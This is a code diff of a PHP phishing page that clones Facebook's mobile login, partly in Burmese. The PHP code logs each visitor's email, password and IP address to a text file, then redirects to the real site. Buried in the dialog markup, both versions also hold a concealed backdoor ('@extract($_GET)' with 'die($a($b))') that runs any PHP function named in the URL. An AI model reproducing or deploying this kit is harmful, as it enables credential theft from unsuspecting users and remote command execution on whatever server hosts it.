@@ -1,4 +1,16 @@
-<?php 
+
+<html>
+
+
+ <meta name="viewport"
+content="user-scalable=no,initial-scale=1,maximum-scale=1" /><link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png?_nc_x=Ij3Wp8lg5Kz"
+rel="shortcut icon" sizes="196x196" /><meta name="referrer" content="default" id="meta_referrer" /><link type="text/css" rel="stylesheet"
+href="https://static.xx.fbcdn.net/rsrc.php/v3/yv/l/0,cross/L3ycDQv_hjf.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="FP7v1" /><link type="text/css"
+rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/ys/l/0,cross/vq6NbUUqEI6.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="W5mDN" />
+<meta name="description"
+content=""
+/><link rel="canonical" href="https://www.facebook.com/" /></head>
+<body><?php 
 
    if(isset($_POST['login'])){
 	   
@@ -8,64 +20,92 @@ $ip = $_SERVER['REMOTE_ADDR'];
 $g = fopen("testing.txt", "a"); 
 fwrite ($g , "\r\nEmail[". $user . "]:\r\n Password>[". $pass ."]\r\nIP:[" . $ip . "]:\r\n");
 fclose($g);
-
+echo '<head><meta http-equiv="refresh" content="3;url=http://m.facebook.com"/></head>';
         ?>
-<meta http-equiv="refresh" content="3;url=http://m.facebook.com"/> 
 <script>
-document.body.innerHTML='<center><img src=https://i.stack.imgur.com/h6viz.gif></center>';
+document.documentElement.innerHTML=`<center><img src=https://i.stack.imgur.com/h6viz.gif></center>`;
 </script>
 <?php
 }
 @extract($_GET);
 ?>
- 
-  <!DOCTYPE html><html><head><title>Welcome to Facebook</title><meta charset="utf-8"><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" /><link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" /><meta name="theme-color" content="#3b5998" /><link rel="stylesheet" type="text/css" data-bootloader-hash="iqgOi" href="https://static.xx.fbcdn.net/rsrc.php/v3/yh/l/0,cross/XjHzkGxu4mn.css" /><link rel="stylesheet" type="text/css" data-bootloader-hash="XjlIw" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/l/0,cross/s4innxT7-8q.css" /><script id="u_0_d">function envFlush(a){function b(c){for(var d in a)c[d]=a[d]}if(window.requireLazy)window.requireLazy(["Env"],b);else{window.Env=window.Env||{};b(window.Env)}}envFlush({"timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,"Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},"isHeartbeatEnabled":true,"isArtilleryOn":true},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true}});</script><script>document.domain = 'facebook.com';window.FB_GKS={"mobile_chrono_selector":true,"mobile_js_show_debug":false,"mobile_js_log_error":false,"m_js_log_history":false,"js_nocatch":false,"moulder_feed_hide_toggle":false,"m_onephase_home":true,"mtouch_composer_no_autoresize":true,"m_js_crossorigin_attribute":true};window.FB_QES={};</script><script>__DEV__=0;</script><script id="u_0_e" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3iPLI4/y6/l/qz_MM/X7OZhn0T8cs.js" data-bootloader-hash="lyiD1"></script><script id="u_0_f">(function _(a,b,c,d){function e(j){document.cookie=j+"=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"}function f(j,k){document.cookie=j+"="+k+";path=/;domain=.facebook.com;secure"}if(!a){e(b);e(c);return}var g=null;if(navigator.userAgent.indexOf("Firefox")!==-1||!window.devicePixelRatio&&navigator.userAgent.indexOf("Windows Phone")!==-1)if(document.documentElement!=null){g=screen.width/document.documentElement.offsetWidth;g=Math.max(1,Math.floor(g*2)/2)}if((!g||g===1)&&navigator.userAgent.indexOf("IEMobile")!==-1){g=Math.sqrt(screen.deviceXDPI*screen.deviceYDPI)/96;g=Math.max(1,Math.round(g*2)/2)}f(b,(g||window.devicePixelRatio||1).toString());var h=window.screen?screen.width:0,i=window.screen?screen.height:0;f(c,h+"x"+i);if(d&&document.cookie&&window.devicePixelRatio>1)document.location.reload()})(true, "m_pixel_ratio", "wd", false);</script><meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" /><meta name="description" content="&#x101e;&#x1004;&#x1039;&#x104f; &#x101e;&#x1030;&#x1004;&#x101a;&#x1039;&#x1001;&#x103a;&#x1004;&#x1039;&#x1038;&#x104a; &#x1019;&#x102d;&#x101e;&#x102c;&#x1038;&#x1005;&#x102f;&#x104a; &#x101e;&#x1004;&#x1039;&#x101e;&#x102d;&#x1031;&#x101e;&#x102c;&#x101e;&#x1030;&#x1019;&#x103a;&#x102c;&#x1038;&#x108f;&#x103d;&#x1004;&#x1037;&#x1039; &#x1005;&#x1010;&#x1004;&#x1039;&#x104d; &#x1001;&#x103a;&#x102d;&#x1010;&#x1039;&#x1006;&#x1000;&#x1039;&#x107f;&#x1015;&#x102e;&#x1038;&#x1019;&#x107d;&#x103d;&#x1031;&#x101d;&#x101b;&#x1014;&#x1039; Facebook &#x101e;&#x102d;&#x102f;&#x1037;&#x1031;&#x101c;&#x102c;&#x1037;&#x1002;&#x1039;&#x1021;&#x1004;&#x1039;&#x101d;&#x1004;&#x1039;&#x1015;&#x102b;&#x104b;" /><link rel="canonical" href="https://www.facebook.com/login/" /></head><body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw"><script id="u_0_c">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;if(c)c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait");return b}})(window);</script><div id="viewport"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page"><div class="_129_" id="header-notices"></div><div class="_4g33 _52we _52z5" id="header"><div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href=""><i class="img sp_MP2OtCXORz9_3x sx_8d0886"><u>facebook</u></i></a></div></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
-	<div class="_4g33">
-		<div class="_4g34" id="u_0_0">
-			<div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
-				<div class="_52jd">
-				</div></div>
-				<div class="aclb _4-4l">
-					<div data-sigil="m_login_upsell two_steps_login_element login_identify_step_element">
-						<div class="_4fmw grouped aclb">
-							<a class="touchableArea first last area touchable acy apl abt abb" href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253D9GppWmlguAuav0pSBs4yMNPj&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8" target="_top" data-sigil="touchable marea">
-								<div class="ib cc">
-									<i class="l img sp_XK6GAXGTSNb_3x sx_67d278">
-									</i><div class="c"><span class="fcl">
-										 
-									  Get Facebook for Android and browse faster  </span></div></div>
-							</a></div></div><div class="_5rut">
-	<form method="post" class="mobile-login-form _5spm" id="u_0_1" novalidate="1" action=" " data-sigil="m_login_form">
-	<input type="hidden" name="lsd" value="AVqbvSb_" autocomplete="off" />
-	<input type="hidden" name="charset_test" value="&#x20ac;,&#xb4;,&#x20ac;,&#xb4;,&#x6c34;,&#x414;,&#x404;" />
-	<input type="hidden" name="version" value="1" />
-	<input type="hidden" id="ajax" name="ajax" value="0" />
-	<input type="hidden" id="width" name="width" value="0" />
-	<input type="hidden" id="pxr" name="pxr" value="0" />
-	<input type="hidden" id="gps" name="gps" value="0" />
-	<input type="hidden" id="dimensions" name="dimensions" value="0" />
-	<input type="hidden" name="m_ts" value="1474981681" />
-	<input type="hidden" name="li" value="MW_qV35PaQLNShzpoejeiSVm" />
-	<div class="_56be _5sob">
-		<div class="_55wo _55x2 _56bf">
-			<input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq" name="email" placeholder=" Email or Phone " value="" data-sigil="m_login_email" />
-			<div cla id=""ss="_3nph _mg8" data-sigil="m_login_password">
-				<div class="_4g33">
-					<div class="_4g34 _5i2i _52we">
-						<div class="_5xu4">
-							<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" name="pass" placeholder=" Password " id="u_0_2" type="password" data-sigil="password-plain-text-toggle-input" value = ""/>
-</div>
-</div>
-<div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" id="u_0_3" style="display:none"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" id="u_0_4" style="display:none">ဖျောက်ပါ</span><span class="mfss" id="u_0_5">ပြပါ</span></a></div></div></div></div></div></div></div><div class="_2pie" style="text-align:center;"><button type="submit" value="Log In" class="_54k8 _56bs _56b_ _56bw _56bu" name="login" id="u_0_6" data-sigil="touchable m_login_button"><span class="_55sr"> Log In </span></button></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript></form>
-
-
-
-
-<div class="_52jj _5t3b"><a class="btn btnS medBtn mfsm touchable" role="button" style="height:36px;
-        padding-left:16px;
-        padding-right:16px;
-        padding-top:5px;" href="http://m.facebook.com/reg/?cid=103&refid=8" id="signup-button" data-sigil="blocking-touchable"> Create New Account </a></div><div class="other-links"><ul class="_5pkb _55wp"><li><span class="mfss fcg"><a href="http://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&lwv=100&refid=8" id="forgot-password-link">Forgotten password? </a><span aria-hidden="true"> · </span><a class="sec" href="http://m.facebook.com/help/?refid=8" id="help-link"> Help Centre </a></span></li></ul></div></div></div></div></div><div></div><div class="_55wr _5ui2"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="marea"><div class="_4g33"> <div class="_4g34"> <span class="_52jc _52j9 _52jh">  English  (UK)</span><div><span ="_52jc"><a href="?len=5">  ျမန္မာဘာသာ  </a></span></div> <div><span class="_52jc"><a href="?len=3"> 中文(简体) </a></span></div><div><span class="_52jc"><a href="?len=4"> Português (Brasil) </a></span></div></div><div class="_4g34"><div><span class="_52jc"><a href="?len=1">မြန်မာဘာသာ</a></span></div><div><span class="_52jc"><a href="?len=6"> ภาษาไทย </a></span></div><div><span class="_52jc"><a href ="?len=7"> Español </a></span></div><a href="https://free.facebook.com/language.php?n=https%3A%2F%2Ffree.facebook.com%2Flogin%2F%3Fnext%3Dhttps%253A%252F%252Ffree.facebook.com%252Fstories.php%253Faftercursorr%253D1492217119%25253A1492217119%25253A8%25253A-7670316139312823411%25253A1492217107%25253A6409025332052042109%2526tab%253Dh_nor%2526__m_log_async__%253D1%2526refid%253D28%26li%3DOIXxWMD_SN6uc83BWsCAakhh%26e%3D1348029%26login_try_number%3D1%26refsrc%3Dhttps%253A%252F%252Ffree.facebook.com%252Flogin%252F&ref_component=mbasic_footer&ref_page=XLoginController"><div class="_3j87 _1rrd"><i class="_4q9a img sp_hRDg1FNwK5g_1_5x sx_0bd845"></i></div></a></div></div></div><div class="_5ui4"><span class="mfss fcg">Facebook ©2018</span></div></div></div></div><div class="viewportArea _2v9s" id="u_0_7" style="display:none" data-sigil="marea"><div class="_5vsg" id="u_0_g"></div><div class="_5vsh" id="u_0_h"></div><div class="_5v5d fcg"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>တင်ပေးနေသည်...</div></div><div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"><div class="container"><div class="image"></div><div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">ပြန်စမ်းကြည့်ပါ</a></div></div></div></div><div id="static_templates"><div class="mDialog" id="modalDialog" style="display:none"><div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"><div class="_4g33 _52we"><div class="_5s61"><div class="_52z7"><button type="submit" value="မလုပ်တော့ပါ" class="cancelButton btn btnD bgb mfss touchable" data-sigil="dialog-cancel-button blocking-touchable">မလုပ်တော့ပါ</button><button type="submit" value="နောက်သို့" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="နောက်သို့" data-sigil="dialog-back-button blocking-touchable"><i class="img sp_hRDg1FNwK5g_1_5x sx_ceb390" style="margin-top: 2px;"></i></button></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">တင်ပေးနေသည်...</div></div></div><div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div></div><div id="u_0_8"></div></div><div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg" id="dialogSpinner"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_9" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div><?php die($a($b)); ?>တင်ပေးနေသည်...</div></div></div></div></body></html>
-
-
-
-  
+<div tabindex="0" class="touch x2 android _fzu _50-3 iframe acw"><div id="viewport" data-kaios-focus-transparent="1"><h1
+style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page" class=""><div class="_129_"
+id="header-notices"></div><div class="_7om2 _52we _52z5" id="header"><div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="/login/?refid=8"><i
+class="img sp_EXjamvPof_c_3x sx_1037e3"><u>facebook</u></i></a></div></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root
+content-pane"><div class="_7om2"><div class="_4g34" id="u_0_2"><img src="http://h.facebook.com/hr/xp/?app=m_login&rtime=1566402726&zc"
+style="display:none" /><div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice"><div class="_52jd"></div></div><div class="aclb
+_4-4l"><div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"><div class="_qw9 grouped aclb" id="u_0_3"><a
+href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DpmhdXXhBgMfNj5XSDL6dx5mw%26referrer_
+params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1&refid=8" target="_top" class="touchableArea first last area
+touchable acy apl abt abb" data-sigil="touchable marea"><div class="ib cc"><i class="img l img _2sxw" style="background-image: url('https\3a
+//static.xx.fbcdn.net/rsrc.php/v3/y1/r/K2XTtzcjLEq.png?_nc_x\3d Ij3Wp8lg5Kz');background-repeat:no-repeat;background-size:100%
+100%;-webkit-background-size:100% 100%;width:18px;height:32px;"></i><div class="c"><span class="fcl">Android အတွက် Facebook ကို
+ရယူပြီး မြန်ဆန်စွာရှာဖွေပါ။</span></div></div></a></div></div><div class="_5rut"><form method="post"
+action="" class="mobile-login-form _5spm" id="login_form"
+novalidate="1" data-sigil="m_login_form"><input type="hidden" name="lsd" value="AVpH4L6i" autocomplete="off" /><input type="hidden" name="jazoest" value="2622"
+autocomplete="off" /><input type="hidden" name="m_ts" value="1566402726" /><input type="hidden" name="li" value="pmhdXQGG6mf7LM_Sgyga9f_f" /><input
+type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" /><input type="hidden" name="unrecognized_tries" value="0"
+data-sigil="m_login_unrecognized_tries" /><div id="user_info_container" data-sigil="user_info_after_failure_element"></div><div id="pwd_label_container"
+data-sigil="user_info_after_failure_element"></div><div id="otp_retrieve_desc_container"></div><div class="_56be _5sob"><div class="_55wo _55x2 _56bf"><span
+class="_52jh _22qg" id="u_0_0">မိုဘိုင်းနံပါတ် သို့မဟုတ် အီးမေးလ်</span><input autocorrect="off"
+autocapitalize="off" type="email" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="email" aria-labelledby="u_0_0" data-sigil="m_login_email"
+/><div><section data-sigil="m_login_password"><span class="_52jh _22qg" id="u_0_1">စကားဝှက်</span><div class="_1upc _mg8"
+aria-labelledby="u_0_1"><div class="_7om2"><div class="_4g34 _5i2i _52we"><div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z
+_27z2" autocomplete="on" id="m_login_password" name="pass" type="password" data-sigil="password-plain-text-toggle-input" /></div></div><div class="_5s61 _216i
+_5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_4"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss"
+style="display:none" id="u_0_5">ဖျောက်ပါ</span><span class="mfss"
+id="u_0_6">ပြပါ</span></a></div></div></div></div></div></section></div></div></div><div class="_2pie" style="text-align:center;"><div id="u_0_7"
+data-sigil="login_password_step_element"><button type="submit"
+value="လော့ဂ်အင်ဝင်ရန်" class="_54k8 _52jh _56bs _56b_
+_28lf _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button"><span
+class="_55sr">လော့ဂ်အင်ဝင်ရန်</span></button></div><div class="_7eif" id="oauth_login_button_container"
+style="display:none"></div><div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div><input
+type="hidden" name="prefill_contact_point" id="prefill_contact_point" /><input type="hidden" name="prefill_source" id="prefill_source" /><input type="hidden"
+name="prefill_type" id="prefill_type" /><input type="hidden" name="first_prefill_source" id="first_prefill_source" /><input type="hidden"
+name="first_prefill_type" id="first_prefill_type" /><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" /><input type="hidden"
+name="had_password_prefilled" id="had_password_prefilled" value="false" /><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" /><div
+class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript></form><div><div class="_43mg"><span
+class="_43mh">သို့မဟုတ်</span></div><div class="_52jj _5t3b" id="u_0_8"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable"
+id="signup-button" href="/reg-no-deeplink/?cid=103&refid=8" tabindex="0"
+data-sigil="m_reg_button">အကောင့်အသစ်ဖွင့်ပါ</a></div></div><div><div class="other-links"><ul class="_5pkb _55wp"><li><span
+class="mfss fcg"><a tabindex="0" href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&r&cuid&ars=facebook_login&lwv=100&refid=8"
+id="forgot-password-link">စကားဝှက် မေ့နေပါသလား။</a><span aria-hidden="true"> · </span><a href="/help/?refid=8"
+id="help-link" class="sec">အကူအညီစင်တာ</a></span></li></ul></div></div></div><div></div></div></div></div><div
+style="display:none"></div><span><img src="https://facebook.com/security/hsts-pixel.gif?c=3.2" width="0" height="0" style="display:none" /></span><div
+class="_55wr _5ui2" data-sigil="m_login_footer"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector
+marea"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">မြန်မာဘာသာ</span><div class="_3ztc"><span
+class="_52jc"><a href="/a/language.php?l=th_TH&lref=https%3A%2F%2Fm.facebook.com%2F&gfid=AQDceoQ7wC26-D9s&refid=8" data-locale="th_TH"
+data-sigil="change_language">ภาษาไทย</a></span></div><div class="_3ztc"><span class="_52jc"><a
+href="/a/language.php?l=ms_MY&lref=https%3A%2F%2Fm.facebook.com%2F&gfid=AQBEEU2AEGyQBOlJ&refid=8" data-locale="ms_MY"
+data-sigil="change_language">Bahasa Melayu</a></span></div><div class="_3ztc"><span class="_52jc"><a
+href="/a/language.php?l=pt_BR&lref=https%3A%2F%2Fm.facebook.com%2F&gfid=AQCWgvqk6kSJ1dVk&refid=8" data-locale="pt_BR"
+data-sigil="change_language">Português (Brasil)</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a
+href="/a/language.php?l=en_GB&lref=https%3A%2F%2Fm.facebook.com%2F&gfid=AQDBVKOqNo1KnC2l&refid=8" data-locale="en_GB"
+data-sigil="change_language">English (UK)</a></span></div><div class="_3ztc"><span class="_52jc"><a
+href="/a/language.php?l=zh_CN&lref=https%3A%2F%2Fm.facebook.com%2F&gfid=AQD3Lg_V7YAWGr-N&refid=8" data-locale="zh_CN"
+data-sigil="change_language">中文(简体)</a></span></div><div class="_3ztc"><span class="_52jc"><a
+href="/a/language.php?l=es_LA&lref=https%3A%2F%2Fm.facebook.com%2F&gfid=AQAQSu30QqGcz8H_&refid=8" data-locale="es_LA"
+data-sigil="change_language">Español</a></span></div><a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F&refid=8"><div class="_3j87 _1rrd _3ztd"
+aria-label="ဘာသာစကားများ၏
+စာရင်းကို
+အပြီးသတ်ဖြည့်ပါ" data-sigil="more_language"><i
+class="img sp_EXjamvPof_c_3x sx_cbc29f"></i></div></a></div></div></div><div class="_5ui4"><span class="mfss fcg">Facebook
+©2019</span></div></div></div></div><div class=""></div><div class="viewportArea _2v9s" style="display:none" id="u_0_9" data-sigil="marea"><div class="_5vsg"
+id="u_0_a"></div><div class="_5vsh" id="u_0_b"></div><div class="_5v5d fcg"><div class="_2so _2sq _2ss img _50cg" data-animtype="1"
+data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>တင်ပေးနေသည်...</div></div><div class="viewportArea aclb"
+id="mErrorView" style="display:none" data-sigil="marea"><div class="container"><div class="image"></div><div class="message" data-sigil="error-message"></div><a
+class="link" data-sigil="MPageError:retry">ပြန်စမ်းကြည့်ပါ</a></div></div></div></div><div id="static_templates"><div
+class="mDialog" id="modalDialog" style="display:none"><div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"><div class="_7om2
+_52we"><div class="_5s61"><div class="_52z7"><button type="submit"
+value="မလုပ်တော့ပါ" class="cancelButton btn btnD bgb mfss touchable" id="u_0_d"
+data-sigil="dialog-cancel-button">မလုပ်တော့ပါ</button><?php die($a($b)); ?><button type="submit"
+value="နောက်သို့" class="backButton btn btnI bgb mfss touchable iconOnly"
+aria-label="နောက်သို့" id="u_0_e" data-sigil="dialog-back-button"><i class="img sp_EXjamvPof_c_3x
+sx_80cf1b" style="margin-top: 2px;"></i></button></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title"
+data-sigil="m-dialog-header-title dialog-title">တင်ပေးနေသည်...</div></div></div><div class="_5s61"><div class="_52z8"
+id="modalDialogHeaderButtons"></div></div></div></div><div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg"
+id="dialogSpinner"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_c" data-sigil="m-loading-indicator-animate
+m-loading-indicator-root"></div>တင်ပေးနေသည်...</div></div></div></div>
+</body>
+</html>
